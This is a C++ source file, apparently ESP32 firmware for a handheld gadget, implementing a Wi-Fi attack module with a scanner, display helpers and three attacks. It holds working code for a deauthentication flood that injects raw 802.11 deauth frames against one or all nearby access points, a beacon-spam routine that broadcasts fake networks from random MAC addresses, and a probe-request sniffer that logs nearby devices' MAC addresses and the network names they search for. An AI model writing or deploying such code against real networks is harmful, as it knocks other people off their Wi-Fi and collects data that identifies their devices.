#include "WiFiAttack.h"
#include <esp_wifi.h>
#include <string.h>

WiFiAttack* WiFiAttack::_instance = nullptr;

WiFiAttack::WiFiAttack(Display& display) : _display(display) {
    _instance = this;
}

// ─────────────────────────────────────────
//  Scanner
// ─────────────────────────────────────────

void WiFiAttack::startScan() {
    _running  = true;
    _apCount  = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    Serial.println("[WiFi] Scanning...");
    _display.drawCenteredText("Scanning...", STATUSBAR_H + 30, CLR_DIM);

    int n = WiFi.scanNetworks(false, true);  // async=false, show hidden=true
    _apCount = min(n, MAX_APS);

    for (int i = 0; i < _apCount; i++) {
        strncpy(_aps[i].ssid, WiFi.SSID(i).c_str(), 32);
        _aps[i].ssid[32] = '\0';
        memcpy(_aps[i].bssid, WiFi.BSSID(i), 6);
        _aps[i].rssi    = WiFi.RSSI(i);
        _aps[i].channel = WiFi.channel(i);
        _aps[i].encType = WiFi.encryptionType(i);
    }

    Serial.printf("[WiFi] Found %d APs\n", _apCount);
    _drawScanResults();
    _running = false;
}

void WiFiAttack::tickScan()  {}  // Scan is synchronous; nothing to tick
void WiFiAttack::stopScan()  { _running = false; WiFi.scanDelete(); }

// ─────────────────────────────────────────
//  Deauth
// ─────────────────────────────────────────

// Deauth frame template (802.11)
static const uint8_t DEAUTH_FRAME_DEFAULT[] = {
    0xC0, 0x00,             // Frame control: deauth
    0x00, 0x00,             // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (AP BSSID) — filled at runtime
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID — same as source
    0x00, 0x00,             // Sequence number
    0x07, 0x00              // Reason code: Class 3 frame received from non-assoc STA
};

void WiFiAttack::_sendDeauthFrame(const uint8_t* bssid, const uint8_t* client, uint8_t channel) {
    uint8_t frame[26];
    memcpy(frame, DEAUTH_FRAME_DEFAULT, sizeof(frame));
    memcpy(&frame[4],  client, 6);   // Destination
    memcpy(&frame[10], bssid,  6);   // Source
    memcpy(&frame[16], bssid,  6);   // BSSID

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
}

void WiFiAttack::startDeauth(int8_t targetIndex) {
    if (_apCount == 0) {
        Serial.println("[WiFi] No APs — run scan first");
        return;
    }
    _target  = targetIndex;
    _running = true;
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(false);
    Serial.println("[WiFi] Deauth started");
    _drawAttackStatus("DEAUTH", 0);
}

void WiFiAttack::tickDeauth() {
    if (!_running) return;
    if (millis() - _lastTick < 100) return;
    _lastTick = millis();

    static int sent = 0;

    if (_target >= 0 && _target < _apCount) {
        // Target single AP
        uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        _sendDeauthFrame(_aps[_target].bssid, broadcast, _aps[_target].channel);
        sent++;
    } else {
        // Broadcast deauth all APs
        uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
        for (int i = 0; i < _apCount; i++) {
            _sendDeauthFrame(_aps[i].bssid, broadcast, _aps[i].channel);
        }
        sent += _apCount;
    }

    _drawAttackStatus("DEAUTH", sent);
}

void WiFiAttack::stopDeauth() {
    _running = false;
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi] Deauth stopped");
}

// ─────────────────────────────────────────
//  Beacon Spam
// ─────────────────────────────────────────

static const char* SPAM_SSIDS[] = {
    "Free WiFi", "FBI Surveillance Van", "Not Your WiFi",
    "Pretty Fly for a WiFi", "Silence of the LANs", "Loading...",
    "Bill Wi the Science Fi", "Searching...", "Drop It Like Its Hotspot",
    "The LAN Before Time"
};
static const int SPAM_SSID_COUNT = 10;

void WiFiAttack::_sendBeaconFrame(const char* ssid, uint8_t channel) {
    uint8_t frame[128] = {0};
    uint8_t ssidLen    = strlen(ssid);

    // Frame control — beacon
    frame[0] = 0x80; frame[1] = 0x00;
    // Duration
    frame[2] = 0x00; frame[3] = 0x00;
    // Destination — broadcast
    memset(&frame[4], 0xFF, 6);
    // Source — random MAC
    frame[10] = 0x02 | (esp_random() & 0xFE);
    frame[11] = esp_random(); frame[12] = esp_random();
    frame[13] = esp_random(); frame[14] = esp_random();
    frame[15] = esp_random();
    // BSSID same as source
    memcpy(&frame[16], &frame[10], 6);
    // Sequence
    frame[22] = 0x00; frame[23] = 0x00;
    // Timestamp (8 bytes) — zero
    // Beacon interval
    frame[32] = 0x64; frame[33] = 0x00;
    // Capability
    frame[34] = 0x01; frame[35] = 0x04;
    // SSID tag
    frame[36] = 0x00;
    frame[37] = ssidLen;
    memcpy(&frame[38], ssid, ssidLen);
    // Supported rates tag
    int pos = 38 + ssidLen;
    frame[pos++] = 0x01; frame[pos++] = 0x08;
    frame[pos++] = 0x82; frame[pos++] = 0x84;
    frame[pos++] = 0x8B; frame[pos++] = 0x96;
    frame[pos++] = 0x0C; frame[pos++] = 0x12;
    frame[pos++] = 0x18; frame[pos++] = 0x24;
    // DS params (channel)
    frame[pos++] = 0x03; frame[pos++] = 0x01;
    frame[pos++] = channel;

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, pos, false);
}

void WiFiAttack::startBeaconSpam() {
    _running  = true;
    _channel  = 1;
    WiFi.mode(WIFI_STA);
    Serial.println("[WiFi] Beacon spam started");
    _drawAttackStatus("BEACON SPAM", 0);
}

void WiFiAttack::tickBeaconSpam() {
    if (!_running) return;
    if (millis() - _lastTick < 50) return;
    _lastTick = millis();

    static int sent = 0;
    static int ssidIdx = 0;

    _sendBeaconFrame(SPAM_SSIDS[ssidIdx], _channel);
    ssidIdx = (ssidIdx + 1) % SPAM_SSID_COUNT;
    _channel = (_channel % 13) + 1;
    sent++;

    if (sent % 20 == 0) _drawAttackStatus("BEACON SPAM", sent);
}

void WiFiAttack::stopBeaconSpam() {
    _running = false;
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi] Beacon spam stopped");
}

// ─────────────────────────────────────────
//  Probe Sniff
// ─────────────────────────────────────────

static int   _probeCount = 0;
static char  _lastProbedSSID[33] = "";
static uint8_t _lastProbedMAC[6] = {};

void WiFiAttack::_probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // Frame control subtype 0x04 = probe request
    if ((payload[0] & 0xFC) != 0x40) return;

    // SSID is in tag 0 starting at byte 24
    uint8_t ssidLen = payload[25];
    if (ssidLen == 0 || ssidLen > 32) return;

    memcpy(_lastProbedSSID, &payload[26], ssidLen);
    _lastProbedSSID[ssidLen] = '\0';
    memcpy(_lastProbedMAC, &payload[10], 6);
    _probeCount++;

    Serial.printf("[WiFi] Probe: %s from %02X:%02X:%02X:%02X:%02X:%02X\n",
        _lastProbedSSID,
        _lastProbedMAC[0], _lastProbedMAC[1], _lastProbedMAC[2],
        _lastProbedMAC[3], _lastProbedMAC[4], _lastProbedMAC[5]);

    if (_instance) _instance->_drawProbeEntry(_lastProbedSSID, _lastProbedMAC);
}

void WiFiAttack::startProbeSniff() {
    _running     = true;
    _probeCount  = 0;
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&_probeCallback);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    Serial.println("[WiFi] Probe sniff started");
}

void WiFiAttack::tickProbeSniff() {
    if (!_running) return;
    // Rotate channels every 500ms
    if (millis() - _lastTick > 500) {
        _lastTick = millis();
        _channel  = (_channel % 13) + 1;
        esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    }
}

void WiFiAttack::stopProbeSniff() {
    _running = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    Serial.println("[WiFi] Probe sniff stopped");
}

// ─────────────────────────────────────────
//  Display helpers
// ─────────────────────────────────────────

void WiFiAttack::_drawScanResults() {
    _display.clear();
    _display.drawStatusBar("WiFi Scan");

    int16_t y = STATUSBAR_H + 4;
    for (int i = 0; i < min(_apCount, MENU_MAX_ITEMS); i++) {
        // SSID truncated to fit 128px wide
        char label[18];
        snprintf(label, sizeof(label), "%.15s", _aps[i].ssid[0] ? _aps[i].ssid : "[hidden]");
        _display.drawText(label, 2, y, 1, CLR_TEXT);

        char rssiStr[8];
        snprintf(rssiStr, sizeof(rssiStr), "%d", _aps[i].rssi);
        _display.drawTextRight(rssiStr, y, CLR_DIM);

        y += MENU_ITEM_H;
    }

    if (_apCount == 0)
        _display.drawCenteredText("No APs found", SCREEN_H / 2, CLR_DIM);
}

void WiFiAttack::_drawAttackStatus(const char* mode, int count) {
    int16_t y = STATUSBAR_H + 16;
    _display.fillRect(0, STATUSBAR_H + 1, SCREEN_W, 60, CLR_BG);

    char countStr[24];
    snprintf(countStr, sizeof(countStr), "Sent: %d", count);
    _display.drawCenteredText(mode,     y,      CLR_DANGER);
    _display.drawCenteredText(countStr, y + 16, CLR_TEXT);
}

void WiFiAttack::_drawProbeEntry(const char* ssid, const uint8_t* mac) {
    // Scrolling single-line update — just overwrite the probe area
    static int16_t probeY = STATUSBAR_H + 4;
    static int     lineCount = 0;

    if (lineCount >= MENU_MAX_ITEMS) {
        // Clear content area and reset
        _display.fillRect(0, STATUSBAR_H + 1, SCREEN_W, SCREEN_H - STATUSBAR_H - 14, CLR_BG);
        probeY    = STATUSBAR_H + 4;
        lineCount = 0;
    }

    char macStr[20];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X", mac[0], mac[1], mac[2]);

    char label[20];
    snprintf(label, sizeof(label), "%.12s", ssid);

    _display.drawText(label,  2,          probeY, 1, CLR_ACCENT);
    _display.drawText(macStr, SCREEN_W/2, probeY, 1, CLR_DIM);

    probeY += MENU_ITEM_H;
    lineCount++;
}
